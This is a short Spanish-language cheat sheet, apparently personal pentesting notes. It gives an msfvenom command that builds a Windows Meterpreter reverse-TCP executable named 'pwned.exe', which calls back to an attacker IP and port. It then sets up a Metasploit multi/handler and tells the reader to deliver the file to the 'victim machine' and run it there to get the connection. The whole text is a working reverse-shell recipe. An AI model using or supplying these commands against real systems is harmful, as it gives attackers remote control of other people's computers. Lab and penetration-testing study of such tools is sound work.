
---

---

###### Recomendable estar como SUDO

```bash
//sintaxis
msfvenom <payload> <localhost> <port>
```

### Payload WINDOWS

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.77 LPORT=4444 -f exe -o pwned.exe
```

- Compartir este arhchivo a maquina vicitma, podemos crear srv python3


### Multihandler - Meterpreter
```bash
msfconsole -q
use /multi/handler
show options

//configurar mismo payload, host atacante y puerto que especificamos en el payload de *msfvenom*
run
```

- Por ultimo ejecutar el pwned.exe, desde la maquina victima para recibir la conexion